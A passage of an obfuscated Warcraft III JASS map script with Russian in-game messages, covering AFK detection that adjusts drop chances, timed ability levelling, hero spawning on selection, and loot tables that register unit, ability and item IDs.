call TriggerRegisterPlayerUnitEvent(L8,Player(L9),EVENT_PLAYER_UNIT_DEATH,null)
set L9=L9+1
endloop
call TriggerAddAction(L8,function jT)
set L8=null
endfunction
function jV takes player Ht returns nothing
if MS[GetPlayerId(Ht)]>=300 and MS[GetPlayerId(Ht)]!=302 then
if MT[GetPlayerId(Ht)]!=null then
call BJDebugMsg("|c00ffff00"+GetPlayerName(Ht)+"|r находится в |c00ff0000афк режиме|r! Шанс дропа понижен.")
set MK=MK-1
endif
endif
endfunction
function jW takes nothing returns nothing
local integer L9=0
loop
exitwhen L9>7
if GetPlayerSlotState(Player(L9))==PLAYER_SLOT_STATE_PLAYING and MX[L9]!=true then
if MS[L9]<300 and UnitAlive(MT[GetPlayerId(Player(L9))]) then
call SetUnitAbilityLevel(MT[GetPlayerId(Player(L9))],$41496432,GetUnitAbilityLevel(MT[GetPlayerId(Player(L9))],$41496432)+1)
if GetUnitAbilityLevel(MT[GetPlayerId(Player(L9))],$41496432)>=60 then
call SetUnitAbilityLevel(MT[GetPlayerId(Player(L9))],$41496432,1)
if GetUnitAbilityLevel(MT[GetPlayerId(Player(L9))],$41496433)>=1 then
call SetUnitAbilityLevel(MT[GetPlayerId(Player(L9))],$41496433,GetUnitAbilityLevel(MT[GetPlayerId(Player(L9))],$41496433)+1)
else
call UnitAddAbility(MT[GetPlayerId(Player(L9))],$41496433)
endif
if GetUnitAbilityLevel(MT[GetPlayerId(Player(L9))],$41496433)>=23 then
call SetUnitAbilityLevel(MT[GetPlayerId(Player(L9))],$41496433,1)
if GetUnitAbilityLevel(MT[GetPlayerId(Player(L9))],$41496434)>=1 then
call SetUnitAbilityLevel(MT[GetPlayerId(Player(L9))],$41496434,GetUnitAbilityLevel(MT[GetPlayerId(Player(L9))],$41496434)+1)
else
call UnitAddAbility(MT[GetPlayerId(Player(L9))],$41496434)
endif
endif
endif
endif
else
set MS[L9]=0
endif
set L9=L9+1
endloop
endfunction
function jX takes nothing returns nothing
local integer L9=0
loop
exitwhen L9>7
if GetPlayerSlotState(Player(L9))==PLAYER_SLOT_STATE_PLAYING and MX[L9]!=true then
set MS[L9]=MS[L9]+1
if MS[L9]==300 then
call jV(Player(L9))
if MS[L9]>=300 then
set MS[L9]=302
endif
endif
else
set MS[L9]=0
endif
set L9=L9+1
endloop
endfunction
function jY takes nothing returns nothing
if MS[GetPlayerId(GetTriggerPlayer())]>=300 then
call BJDebugMsg("|c00ffff00"+GetPlayerName(GetTriggerPlayer())+"|r вышел из |c0000ff00афк режима|r! Шанс дропа вернулся в норму.")
if MT[GetPlayerId(GetTriggerPlayer())]!=null then
if MK>=4 and GetPlayerName(Player(8))=="TCoM" then
set MK=4
else
set MK=MK+1
endif
endif
set MS[GetPlayerId(GetTriggerPlayer())]=0
elseif MS[GetPlayerId(GetTriggerPlayer())]>0 then
set MS[GetPlayerId(GetTriggerPlayer())]=0
endif
endfunction
function jZ takes nothing returns nothing
if GetIssuedOrderId()==851973 then
return
endif
if MS[GetPlayerId(GetTriggerPlayer())]>=300 then
call BJDebugMsg("|c00ffff00"+GetPlayerName(GetTriggerPlayer())+"|r вышел из афк режима! Шанс дропа вернулся в норму.")
if MT[GetPlayerId(GetTriggerPlayer())]!=null then
if MK>=4 and GetPlayerName(Player(8))=="TCoM" then
set MK=4
else
set MK=MK+1
endif
endif
set MS[GetPlayerId(GetTriggerPlayer())]=0
elseif MS[GetPlayerId(GetOwningPlayer(GetOrderedUnit()))]>0 then
set MS[GetPlayerId(GetOwningPlayer(GetOrderedUnit()))]=0
endif
endfunction
function ja takes trigger MV returns nothing
local integer L9=0
loop
exitwhen L9>7
call TriggerRegisterPlayerEvent(MV,Player(L9),EVENT_PLAYER_END_CINEMATIC)
call TriggerRegisterPlayerChatEvent(MV,Player(L9),"",false)
call TriggerRegisterPlayerUnitEvent(MV,Player(L9),EVENT_PLAYER_UNIT_SELECTED,null)
call TriggerRegisterPlayerUnitEvent(MV,Player(L9),EVENT_PLAYER_UNIT_DESELECTED,null)
call TriggerRegisterPlayerEvent(MV,Player(L9),EVENT_PLAYER_ARROW_LEFT_DOWN)
call TriggerRegisterPlayerEvent(MV,Player(L9),EVENT_PLAYER_ARROW_RIGHT_DOWN)
call TriggerRegisterPlayerEvent(MV,Player(L9),EVENT_PLAYER_ARROW_DOWN_DOWN)
call TriggerRegisterPlayerEvent(MV,Player(L9),EVENT_PLAYER_ARROW_UP_DOWN)
call TriggerRegisterPlayerEvent(MV,Player(L9),EVENT_PLAYER_ARROW_LEFT_UP)
call TriggerRegisterPlayerEvent(MV,Player(L9),EVENT_PLAYER_ARROW_RIGHT_UP)
call TriggerRegisterPlayerEvent(MV,Player(L9),EVENT_PLAYER_ARROW_DOWN_UP)
call TriggerRegisterPlayerEvent(MV,Player(L9),EVENT_PLAYER_ARROW_UP_UP)
set L9=L9+1
endloop
endfunction
function jb takes nothing returns nothing
local trigger MR=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(MR,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerRegisterAnyUnitEventBJ(MR,EVENT_PLAYER_UNIT_ISSUED_POINT_ORDER)
call TriggerRegisterAnyUnitEventBJ(MR,EVENT_PLAYER_UNIT_ISSUED_ORDER)
call TriggerAddAction(MR,function jZ)
set MR=null
endfunction
function jc takes nothing returns nothing
local trigger MU=CreateTrigger()
call ja(MU)
call TriggerAddAction(MU,function jY)
set MU=null
endfunction
function jd takes nothing returns nothing
local trigger MW=CreateTrigger()
call TriggerRegisterTimerEvent(MW,1.,true)
call TriggerAddAction(MW,function jX)
set MW=null
set MW=CreateTrigger()
call TriggerRegisterTimerEvent(MW,60,true)
call TriggerAddAction(MW,function jW)
set MW=null
endfunction
function je takes nothing returns nothing
local player MZ=GetTriggerPlayer()
local integer Ma=GetPlayerId(MZ)
local unit Hu
local location Mc
if MT[Ma]==null and Mb[Ma]!=0 then
set Mc=Location(-15600,2440)
set Hu=CreateUnitAtLoc(MZ,Mb[Ma],Mc,0)
if GetLocalPlayer()==MZ then
call PanCameraToTimed(GetLocationX(Mc),GetLocationY(Mc),0)
call ClearSelection()
call SelectUnit(Hu,true)
endif
set Mb[Ma]=0
call RemoveLocation(Mc)
set Mc=null
endif
set MZ=null
set Hu=null
endfunction
function jf takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local player MZ=GetTriggerPlayer()
local integer Ma=GetPlayerId(MZ)
if MT[Ma]==null then
if GetUnitTypeId(Hu)==$48303646 then
set Mb[Ma]=$48303356
elseif GetUnitTypeId(Hu)==$48303635 then
set Mb[Ma]=$48303344
elseif GetUnitTypeId(Hu)==$4F30304F then
set Mb[Ma]=$4F303034
elseif GetUnitTypeId(Hu)==$48303636 then
set Mb[Ma]=$48303550
elseif GetUnitTypeId(Hu)==$48303648 then
set Mb[Ma]=$48303036
elseif GetUnitTypeId(Hu)==$48303649 then
set Mb[Ma]=$48303031
elseif GetUnitTypeId(Hu)==$48303644 then
set Mb[Ma]=$48303058
elseif GetUnitTypeId(Hu)==$48303637 then
set Mb[Ma]=$48303147
elseif GetUnitTypeId(Hu)==$4830354E then
set Mb[Ma]=$48303437
elseif GetUnitTypeId(Hu)==$48303638 then
set Mb[Ma]=$48303534
elseif GetUnitTypeId(Hu)==$48303639 then
set Mb[Ma]=$48303032
elseif GetUnitTypeId(Hu)==$55303132 then
set Mb[Ma]=$5530304B
elseif GetUnitTypeId(Hu)==$48303743 then
set Mb[Ma]=$48303030
elseif GetUnitTypeId(Hu)==$4F30304D then
set Mb[Ma]=$4F303032
elseif GetUnitTypeId(Hu)==$48303641 then
set Mb[Ma]=$48303443
elseif GetUnitTypeId(Hu)==$48303642 then
set Mb[Ma]=$48303046
elseif GetUnitTypeId(Hu)==$4F30304E then
set Mb[Ma]=$4F303036
elseif GetUnitTypeId(Hu)==$48303643 then
set Mb[Ma]=$48303131
elseif GetUnitTypeId(Hu)==$4830364A then
set Mb[Ma]=$48303353
elseif GetUnitTypeId(Hu)==$48303645 then
set Mb[Ma]=$48303034
elseif GetUnitTypeId(Hu)==$4830364B then
set Mb[Ma]=$4830304C
elseif GetUnitTypeId(Hu)==$45303131 then
set Mb[Ma]=$45303057
elseif GetUnitTypeId(Hu)==$4830364C then
set Mb[Ma]=$4830314B
elseif GetUnitTypeId(Hu)==$4F303050 then
set Mb[Ma]=$4F303030
elseif GetUnitTypeId(Hu)==$4830364D then
set Mb[Ma]=$48303259
elseif GetUnitTypeId(Hu)==$45303132 then
set Mb[Ma]=$45303033
elseif GetUnitTypeId(Hu)==$48303647 then
set Mb[Ma]=$48303033
elseif GetUnitTypeId(Hu)==$4830344A then
set Mb[Ma]=$4830354D
elseif GetUnitTypeId(Hu)==$4F30304C then
set Mb[Ma]=$4F303049
endif
endif
set MZ=null
set Hu=null
endfunction
function jg takes nothing returns nothing
local integer L9=0
local trigger MY
call jb()
call jc()
call jd()
set MY=CreateTrigger()
loop
call TriggerRegisterPlayerUnitEvent(MY,Player(L9),EVENT_PLAYER_UNIT_SELECTED,null)
set L9=L9+1
exitwhen L9>7
endloop
call TriggerAddAction(MY,function jf)
set MY=null
set MY=CreateTrigger()
set L9=0
loop
call TriggerRegisterPlayerEvent(MY,Player(L9),EVENT_PLAYER_END_CINEMATIC)
set L9=L9+1
exitwhen L9>7
endloop
call TriggerAddAction(MY,function je)
set MY=null
endfunction
function jh takes nothing returns nothing
endfunction
function ji takes nothing returns nothing
call TriggerRegisterPlayerChatEvent(Md,Player(0),"-lvl",false)
call TriggerAddAction(Md,function jh)
endfunction
function jj takes nothing returns nothing
call jS(jS(jS(jR($6E303339),$636E6F62,20,null,null),$72687468,0,null,null),$72617439,0,null,null)
call jS(jS(jS(jS(jR($6E303048),$49304A36,15,"Вам выпал |c0000ff00Элемент леса|r",C),$49303434,50,null,null),$49303433,50,null,null),$49303432,50,null,null)
call jS(jS(jR($75303030),$49303436,50,null,null),$49303435,50,null,null)
call jS(jS(jR($6830344F),$49305437,10,"Вам выпала |c00ffff00Часть корабля|r",C),$706E766C,20,"Вам выпал |c0000ffffАктиватор Сета Айса|r",C)
call jS(jS(jS(jS(jS(jS(jS(jS(jR($65303049),$49304230,20,null,null),$49304231,20,null,null),$4930415A,20,null,null),$49304159,20,null,null),$49304158,20,null,null),$49304157,20,null,null),$49304441,2,"Вам выпала |c00007f00Эссенция леса|r",C),$72656A32,4,"Вам выпал |c00ffff00Курьер|r",C)
call jS(jS(jS(jR($68303035),$49303430,50,null,null),$4930335A,50,null,null),$49303431,50,null,null)
call jS(jS(jR($6E30324E),$49304A34,15,"Вам выпал |c00ff7f00Элемент пауков|r",C),$49305055,100,null,null)
call jS(jS(jS(jS(jS(jS(jS(jS(jS(jR($6E303548),$49305234,5,"Вам выпало |c0000ff00Ядовитое Жало|r",C),$49303845,2,"Вам выпал |c00ffff00Эскиз Руны|r",C),$49305855,3,"Вам выпал |c00ff00ffКурьер Арахнид|r",C),$6B67616C,20,null,null),$62726167,20,null,null),$69776272,20,null,null),$656E766C,20,null,null),$676F626D,20,null,null),$74656C73,20,null,null)
call jS(jS(jS(jS(jS(jR($6E303539),$49304930,5,"Вам выпала |c007d7d7dГнилая Туша|r",C),$49304853,10,"Вам выпала |c00ffff00Вспышка Ярости|r",C),$49304856,10,"Вам выпала |c00ffff00Полет Мысли|r",C),$49304858,10,"Вам выпала |c00ffff00Яркость|r",C),$72617433,10,"Вам выпало |c00ff0000Броня мрази|r",C)
call jS(jS(jS(jR($6830324F),$49304545,12,"Вам выпал |c00ff0000Феникс|r",C),$49304547,12,"Вам выпал |c00ffff00Только во снах|r",C),$49304546,12,"Вам выпала |c00ff9696Душевная Боль|r",C)
call jS(jR($68303332),$4930454F,10,"Вам выпал |c00ffff00Древний пергамент|r",C)
call jS(jS(jS(jS(jR($6E303356),$696E6673,20,null,null),$6D6E7374,20,null,null),$70676865,20,null,null),$49305256,2,"Вам выпал |c006969ffОсколок Льда|r",C)
call jS(jS(jS(jR($6E303352),$776F6D73,20,"Вам выпал |c00ffff00Свиток ловкости|r",C),$776C7364,20,"Вам выпал |c00ffff00Свиток силы|r",C),$77736873,20,"Вам выпал |c00ffff00Свиток разума|r",C)
call jS(jS(jR($6E30374A),$49305239,7,"Вам выпал |c007d7d7dКаменный элемент|r",C),$6B336D33,2,"Вам выпала |c007d7d7dЭссенция камня|r",C)
call jS(jS(jR($6E303749),$49305238,7,"Вам выпала |c007d7d7dКрепкая шкура|r",C),$736F7266,2,"Вам выпала |c004E2A04Эссенция земли|r",C)
call jS(jS(jR($6E303433),$49304239,7,"Вам выпало |c00ffff00Яйцо Саламандры|r",C),$676F7072,2,"Вам выпала |c00ffff00Эссенция моря|r",C)
call jS(jS(jR($75303049),$676F6D6E,7,"Вам выпала |c00ff00ffСущность Детерока|r",C),$49305257,2,"Вам выпала |c007d7d7dЭссенция тьмы|r",C)
call jS(jS(jS(jR($6E303537),$49304939,10,"Вам выпала |c00ffff00Ахилеска|r",C),$61727368,10,"Вам выпало |c00ff0000Затмение|r",C),$64746862,2,"Вам выпала |c006969ffЭссенция ракообразного|r",C)
call jS(jS(jR($7530304C),$49304A33,10,"Вам выпал |c00ffff00Элемент зверя|r",C),$49304F4B,20,"Вам выпала |c007d7d7dКость Мертвеца|r",C)
call jS(jS(jR($7530304A),$49304F4C,15,"Вам выпали |c007d7d7dКлыки|r",C),$49304150,15,"Вам выпала |c00ff00ffЧастица Тьмы|r",C)
call jS(jR($6E303250),$49303241,8,"Вам выпал |c00ff7f00Шлем сосредоточения|r",C)
call jS(jS(jR($6E303334),$49303242,3,"Вам выпал |c00ff00ffЭлемент демона|r",C),$4930485A,5,"Вам выпал |c00ffff00Ничтожный Свиток|r",C)
call jS(jS(jS(jS(jR($6E303555),$49304C33,7,"Вам выпала |c00ff9696Душа Галлахана|r",C),$49303158,1,"Вам выпал |c00ff0000Осколок Руны|r",C),$7468646D,3,"Вам выпал |c00ff00ffЗародыш пламени|r",C),$49305858,3,"Вам выпал |c0000ffffКурьер Галлаханчик|r",C)
call jS(jS(jS(jS(jR($6E303553),$49304C34,7,"Вам выпала |c000000ffДуша Мора|r",C),$49303459,1,"Вам выпал |c006969ffОсколок Руны|r",C),$616E6667,3,"Вам выпала |c00ff7f00Астральная искра|r",C),$49305859,3,"Вам выпал |c00ff00ffКурьер Мини-Мор|r",C)
call jS(jS(jS(jS(jR($6E303554),$49304C35,7,"Вам выпала |c0000ffffДуша Крушителя|r",C),$49303156,1,"Вам выпал |c0000ff00Осколок Руны|r",C),$626C6261,3,"Вам выпала |c00ff7f00Нестабильная сущность|r",C),$4930585A,3,"Вам выпал |c00ff00ffКурьер Крушитель|r",C)
call jS(jS(jS(jS(jS(jS(jS(jR($68303045),$49304244,10,"Вам выпала |c00ffff00Меткость|r",C),$49304245,10,"Вам выпало |c00ffff00Копье лунного Света|r",C),$49304248,10,"Вам выпала |c00ffff00Накидка Эльфов|r",C),$49304246,10,"Вам выпал |c00ffff00Череп Покойника|r",C),$49304247,10,"Вам выпал |c00ffff00Посох Смертника|r",C),$49304249,10,"Вам выпал |c00ffff00Эликсир Выносливости|r",C),$66726867,4,"Вам выпал |c00ff00ffКурьер|r",C)
call jS(jS(jS(jR($6E303456),$49304658,10,"Вам выпала |c00ff9696Карта Сокровищ|r",C),$49304656,10,"Вам выпал |c00ffff00Ящик Золота|r",C),$49304657,10,"Вам выпала |c0000ffffРуна Лихорадки|r",C)
call jS(jS(jS(jR($68303233),$4930424A,10,"Вам выпала |c00ff0000Книга Силы|r",C),$4930424B,10,"Вам выпала |c0000ff00Книга Ловкости|r",C),$4930424C,10,"Вам выпала |c000000ffКнига Разума|r",C)
call jS(jS(jS(jS(jS(jS(jR($6E303445),$49304232,10,"Вам выпала |c00ff7f00Власть Порчи|r",C),$49304235,10,"Вам выпала |c00ff7f00Власть Тьмы|r",C),$49304237,10,"Вам выпала |c00ff7f00Похищение Жизни|r",C),$49304236,10,"Вам выпала |c00ff7f00Похищение Маны|r",C),$49304233,10,"Вам выпала |c00ff7f00Чумная Энергия|r",C),$49304234,10,"Вам выпала |c00ff7f00Темная Сила|r",C)
call jS(jS(jS(jS(jS(jS(jS(jR($6E30354B),$49305235,8,"Вам выпало |c00ff00ffКопыто Кентавра|r",C),$6B336D32,15,null,null),$676C736B,15,null,null),$74686C65,15,null,null),$64706865,15,null,null),$616D7263,15,null,null),$70616D73,15,null,null)
call jS(jS(jS(jR($6E687963),$49303833,7,"Вам выпала |c00ff00ffГолова Тиллы|r",C),$4930314B,7,"Вам выпал |c00ff7f00Черепаший Панцирь|r",C),$4930314D,2,"Вам выпал |c0000ffffАктиватор Сета Костей|r",C)
call jS(jS(jS(jS(jS(jR($75303054),$49303451,15,"Вам выпал |c00ff00ffЭлемент сосредоточения|r",C),$49304831,15,"Вам выпала |c007d7d7dСмертельная сущность|r",C),$73747761,10,"Вам выпала |c00ff6969Гнилая кисть|r",C),$6B796768,2,"Вам выпала |c00ff00ffСломанная коса|r",C),$49304850,15,"Вам выпала |c00ff00ffКусочек смерти|r",C)
call jS(jS(jR($6E303654),$7372746C,10,"Вам выпал |c0000ff00Купель жизни|r",C),$6772736C,10,"Вам выпал |c0000ff00Элементальный слиток|r",C)
call jS(jS(jS(jS(jS(jR($6E303754),$736F756C,7,"Вам выпала |c007d7d7dСтальная корона|r",C),$6573617A,7,"Вам выпал |c00ff9696Перстень из камня|r",C),$7363686C,7,"Вам выпал |c00ff7f00Адамантовый амулет|r",C),$49305930,3,"Вам выпал |c00ff00ffКурьер Лен-Кур|r",C),$49305453,2,"Эска песка",C)
call jS(jR($6E303630),$49305856,5,"Вам выпал |c00ff00ffКурьер Джек-малютка|r",C)
call jS(jR($6E303844),$49305857,5,"Вам выпал |c00ff00ffКурьер Асмо в миниатюре|r",C)
call jS(jS(jS(jS(jR($6E6D6764),$49305042,10,"Вам выпала |c00ff00ffДуша Морина|r",C),$746D7363,20,null,null),$6173626C,20,null,null),$67736F75,20,null,null)
call jS(jS(jS(jS(jR($6E303231),$49303535,10,"Вам выпал |c006969ffКапюшончик|r",C),$49303533,10,"Вам выпал |c006969ffЩиток повиновения|r",C),$49303534,10,"Вам выпала |c006969ffШляпа пирата|r",C),$49304130,100,null,C)
call jS(jR($75303052),$49305258,2,"Вам выпала |c007d7d7dЭссенция Темного Всадника|r",C)
call jS(jS(jR($6E303530),$49305056,50,null,null),$49304753,2,"Вам выпал |c00ff7f00Бронзовый дракон|r",C)
call jS(jS(jS(jR($6E303338),$49303458,10,"Вам выпал |c00ff7f00Элемент Мощи|r",C),$49305043,10,"Вам выпала |c00ff7f00Чума|r",C),$72617466,3,"Вам выпала |c00ff7f00Эссенция пучины|r",C)
call jS(jS(jS(jS(jS(jS(jS(jR($68303548),$64757374,4,"Вам выпал |c00ff00ffКурьер|r",C),$4930534E,50,null,null),$4930535A,7,null,null),$49305354,7,null,null),$49305431,7,null,null),$49305358,7,null,null),$49305356,7,null,null)
call jS(jS(jS(jS(jS(jS(jR($6E303353),$6C676468,10,null,null),$6F646566,10,null,null),$6576746C,10,null,null),$70727674,10,null,null),$72616731,10,null,null),$62737064,10,null,null)
call jS(jS(jS(jR($6E303051),$49303444,100,null,null),$49303445,100,null,null),$49303446,100,null,null)
endfunction
function jk takes nothing returns integer
return Mz
endfunction
function jl takes integer Mp returns nothing
set Mq[Mr]=Mp
call SaveInteger(Ms,0,Mp,Mr)
set Mr=Mr+1
endfunction
function jm takes integer Mx returns nothing
set My[Mz]=Mx
call SaveInteger(M0,0,Mx,Mz)
set Mz=Mz+1
endfunction
function jn takes integer Mt returns nothing
set Mu[Mv]=Mt
call SaveInteger(Mw,0,Mt,Mv)
set Mv=Mv+1
endfunction
function jo takes integer Mp returns integer
if HaveSavedInteger(Ms,0,Mp) then
return LoadInteger(Ms,0,Mp)
else
return -1
endif
endfunction
function jp takes integer Ma returns integer
if Ma<Mr then
return Mq[Ma]
else
return -1
endif
endfunction
function jq takes integer Mt returns integer
if HaveSavedInteger(Mw,0,Mt) then
return LoadInteger(Mw,0,Mt)
else
return 0
endif
endfunction
function jr takes integer Ma returns integer
if Ma<Mv then
return Mu[Ma]
else
return 0
endif
endfunction
function js takes integer Ma returns integer
if Ma<Mz then
return My[Ma]
else
return -1
endif
endfunction
function jt takes nothing returns nothing
call jl($48303058)
call jl($48303046)
call jl($48303032)
call jl($48303034)
call jl($48303033)
call jl($4830304C)
call jl($48303036)
call jl($48303031)
call jl($4F303032)
call jl($45303043)
call jl($4F303030)
call jl($45303033)
call jl($48303131)
call jl($48303147)
call jl($4F303034)
call jl($4F303036)
call jl($5530304B)
call jl($48303259)
call jl($48303344)
call jl($48303356)
call jl($4830314B)
call jl($48303443)
call jl($48303449)
call jl($48303353)
call jl($4530304B)
call jl($4F30304A)
call jl($45303057)
call jl($48303532)
call jl($4F303049)
call jl($48303534)
call jl($4830344A)
call jl($55303130)
call jl($48303030)
call jl($48333333)
call jl($48303547)
call jl($55303131)
call jl($4830354D)
call jl($48303550)
call jl($55303130)
call jl($4F30304C)
call jl($48303437)
call jl($4830364E)
call jl($4830364F)
call jl($48303650)
call jl($4F303051)
call jl($45303133)
call jl($48303651)
call jl($48303652)
call jl($48303653)
call jl($48303654)
call jl($48303655)
call jl($48303656)
call jl($48303657)
call jl($55303133)
call jl($4F303052)
call jl($48303659)
call jl($48303730)
call jl($48303733)
call jl($48303734)
call jl($4F303053)
call jl($48303735)
call jl($48303736)
call jl($4F303054)
call jl($45303055)
call jl($48303738)
call jl($48303737)
call jl($6E303133)
call jl($6E303349)
call jl($6E30334B)
call jl($6E303348)
call jl($6E30334C)
call jl($6E30334A)
call jl($6E303354)
call jl($6E303443)
call jl($6E303444)
call jl($6E30344A)
call jl($6E30344B)
call jl($6E303449)
call jl($6E303450)
call jl($6E303451)
call jl($6E303452)
call jl($6E303453)
call jl($6E303531)
call jl($6E303532)
call jl($6E303533)
call jl($6E303551)
call jl($6E303558)
call jl($6E303631)
call jl($6E303632)
call jl($6E30364B)
call jl($6E30364F)
call jl($6E303741)
call jl($6E303742)
call jl($6E303743)
call jl($6E303744)
call jl($6E303745)
call jl($6E303746)
call jl($6E303747)
call jl($6E303748)
call jl($6E303752)
call jl($6E303830)
call jl($6E303831)
call jl($6E303832)
call jl($6E303833)
call jl($6E303834)
call jl($6E303835)
call jl($30303030)
call jl($6E303849)
call jl($6E30384B)
call jl($6E30384D)
call jl($6E30384F)
call jl($6E303850)
call jl($6E30384E)
call jl($6E303852)
call jl($6E303853)
call jl($6E303851)
call jl($6E303854)
call jl($48303744)
call jl($48303748)
call jl($48303749)
call jl($4830374B)
call jl($4F303055)
call jl($4830374F)
endfunction
function ju takes nothing returns nothing
call jm($41314330)
call jm($41314335)
call jm($41314341)
call jm($41314332)
call jm($41305A50)
call jm($41305A59)
call jm($41305A5A)
call jm($41305235)
call jm($41305138)
call jm($41313032)
call jm($41313033)
call jm($41313034)
call jm($41313035)
call jm($41305A51)
call jm($41305A52)
call jm($41305A53)
call jm($41305444)
call jm($41305052)
call jm($41305A56)
call jm($41305A57)
call jm($41305A58)
call jm($41313036)
call jm($41313037)
call jm($41313038)
call jm($41313039)
call jm($41313041)
call jm($41313042)
call jm($41313043)
call jm($41305557)
call jm($41305247)
call jm($31313131)
call jm($4130545A)
call jm($41313059)
call jm($41313058)
call jm($41313357)
call jm($41304B54)
call jm($41304B4E)
call jm($41304B51)
call jm($41304C4E)
call jm($41304C4B)
call jm($41313733)
call jm($41313433)
call jm($41304D42)
call jm($41305A4C)
call jm($41305A4B)
call jm($41305A4A)
call jm($41305035)
call jm($4131354C)
call jm($41305556)
call jm($41314149)
call jm($4131414A)
call jm($41314154)
call jm($41314153)
call jm($41305333)
call jm($41305334)
call jm($41305335)
call jm($41305336)
call jm($41314430)
call jm($41314431)
call jm($41314450)
call jm($41314451)
call jm($41314452)
call jm($4131424E)
call jm($41313141)
call jm($41496432)
call jm($41496433)
call jm($41496434)
call jm($41313234)
call jm($41313247)
call jm($41304D44)
call jm($41304D4A)
call jm($41314254)
call jm($41304635)
call jm($41305045)
call jm($41305046)
call jm($41303944)
call jm($41304739)
call jm($41313747)
call jm($41313746)
call jm($41313745)
call jm($41313954)
call jm($41377475)
call jm($41387475)
call jm($41397475)
call jm($41307475)
call jm($41313175)
call jm($41313275)
call jm($41313375)
endfunction
function jv takes nothing returns nothing
call jn($72617439)
call jn($6C656467)
call jn($6863756E)
call jn($70656E72)
call jn($77617264)
call jn($73707368)
call jn($706D6E61)
call jn($62656C76)
call jn($72617463)
call jn($72617436)
call jn($726C6966)
call jn($72646532)
call jn($72646531)
call jn($72646533)
call jn($636E6F62)
call jn($6763656C)
call jn($636C7364)
call jn($7373696C)
call jn($7374656C)
call jn($62677374)
call jn($6C687374)
call jn($72687468)
call jn($73626368)
call jn($72696E31)
call jn($7277697A)
call jn($6D636F75)
call jn($636C666D)
call jn($63697269)
call jn($77696C64)
call jn($72737431)
call jn($776E6575)
call jn($7370726E)
call jn($62726163)
call jn($73656872)
call jn($6473756D)
call jn($49303441)
call jn($4930355A)
call jn($49303436)
call jn($49305833)
call jn($4930335A)
call jn($4930314B)
call jn($4930314A)
call jn($49303435)
call jn($49303158)
call jn($49305831)
call jn($49305834)
call jn($49305842)
call jn($49305845)
call jn($49305844)
call jn($49305843)
call jn($49305839)
call jn($49305841)
call jn($49305836)
call jn($49305838)
call jn($49305837)
call jn($49305835)
call jn($49305832)
call jn($49305830)
call jn($4930575A)
call jn($49305758)
call jn($49305759)
call jn($49303155)
call jn($49303151)
call jn($49303231)
call jn($49303145)
call jn($49303149)
call jn($49303439)
call jn($49303139)
call jn($49303153)
call jn($49303430)
call jn($4930315A)
call jn($49303234)
call jn($49303152)
call jn($49303230)
call jn($49303432)
call jn($49303235)
call jn($49303434)
call jn($49303143)
call jn($49303554)
call jn($49303148)
call jn($49303438)
call jn($49303142)
call jn($4930314F)
call jn($49303150)
call jn($49303437)
call jn($4930314E)
call jn($49303157)
call jn($49303431)
call jn($49303156)
call jn($49303233)
call jn($4930314D)
call jn($49303146)
call jn($4930314C)
call jn($49303433)
call jn($49303141)
call jn($49303154)
call jn($49303159)
call jn($49303550)
call jn($49303144)
call jn($49303232)
call jn($49303147)
call jn($49303247)
call jn($49304142)
call jn($49304141)
call jn($49303556)
call jn($49303643)
call jn($4930324B)
call jn($49303455)
call jn($4930324A)
call jn($49303236)
call jn($49303245)
call jn($49303246)
call jn($49303244)
call jn($49303641)
call jn($49303445)
call jn($49303452)
call jn($49303248)
call jn($49303242)
call jn($49304145)
call jn($49304144)
call jn($49303249)
call jn($49303454)
call jn($4930345A)
call jn($49303444)
call jn($49303243)
call jn($49304147)
call jn($49304146)
call jn($49303754)
call jn($49303755)
call jn($4930324F)
call jn($49303237)
call jn($49303239)
call jn($49303238)
call jn($49303638)
call jn($49303456)
call jn($49303633)
call jn($49303631)
call jn($4930324C)
call jn($49303457)
call jn($49303458)
call jn($49303446)
call jn($49303459)
call jn($49303758)
call jn($49303759)
call jn($49303448)
call jn($49303250)
call jn($49303449)
call jn($49303756)
call jn($49303757)
call jn($49303447)
call jn($49303451)
call jn($4930324E)
call jn($49303453)
call jn($49303241)
call jn($4930324D)
call jn($49303847)
call jn($4930384A)
call jn($4930375A)
call jn($49303845)
call jn($49303838)
call jn($49303853)
call jn($49303530)
call jn($49303535)
call jn($49303848)
call jn($49303852)
call jn($49303835)
call jn($49303849)
call jn($49303832)
call jn($49303837)
call jn($49303850)
call jn($4930384C)
call jn($4930384F)
call jn($49303532)
call jn($49303834)
call jn($4930384E)
call jn($49303836)
call jn($49303842)
call jn($49303839)
call jn($49303851)
call jn($4930384D)
call jn($49303831)
call jn($4930384B)
call jn($49303833)
call jn($49303531)
call jn($49303830)
call jn($49303843)
call jn($49303846)
call jn($49303841)
call jn($49303534)
call jn($49303533)
call jn($49303844)
call jn($49303559)
call jn($49303555)
call jn($49303553)
call jn($49303632)
call jn($49303630)
call jn($4930354F)
call jn($49303642)
call jn($49303639)
call jn($49303637)
call jn($49303635)
call jn($49303558)
call jn($49303544)
call jn($49304143)
call jn($49303032)
call jn($49303033)
call jn($49303034)
call jn($49303036)
call jn($49303442)
call jn($49303443)
call jn($49303335)
call jn($49303334)
call jn($49303347)
call jn($4930334A)
call jn($49303349)
call jn($49303339)
call jn($49303331)
call jn($49303338)
call jn($49303342)
call jn($49303345)
call jn($49303341)
call jn($49303337)
call jn($49303346)
call jn($49303336)
call jn($49303344)
call jn($49303348)
call jn($49303343)
call jn($49303333)
call jn($49303332)
call jn($49303259)
call jn($49303330)
call jn($49303634)
call jn($49303557)
call jn($49303645)
call jn($4930354C)
call jn($49303655)
call jn($49303738)
call jn($49303749)
call jn($49303948)
call jn($49303950)
call jn($4930364A)
call jn($49303656)
call jn($49303739)
call jn($4930374A)
call jn($49303949)
call jn($49303951)
call jn($49303733)
call jn($4930364E)
call jn($49303741)
call jn($4930374B)
call jn($4930394A)
call jn($49303952)
call jn($49304133)
call jn($49304134)
call jn($49304135)
call jn($49304136)
call jn($49304137)
call jn($49304138)
call jn($49303649)
call jn($49303657)
call jn($49303742)
call jn($4930374C)
call jn($4930394B)
call jn($49303953)
call jn($4930364B)
call jn($49303658)
call jn($49303743)
call jn($4930374D)
call jn($4930394C)
call jn($49303954)
call jn($4930364C)
call jn($49303659)
call jn($49303744)
call jn($4930374E)
call jn($4930394D)
call jn($49303955)
call jn($4930364F)
call jn($4930365A)
call jn($49303745)
call jn($4930374F)
call jn($4930394E)
call jn($49303956)
call jn($4930364D)
call jn($49303730)
call jn($49303746)
call jn($49303750)
call jn($4930394F)
call jn($49303957)
call jn($49303947)
call jn($49303945)
call jn($49303946)
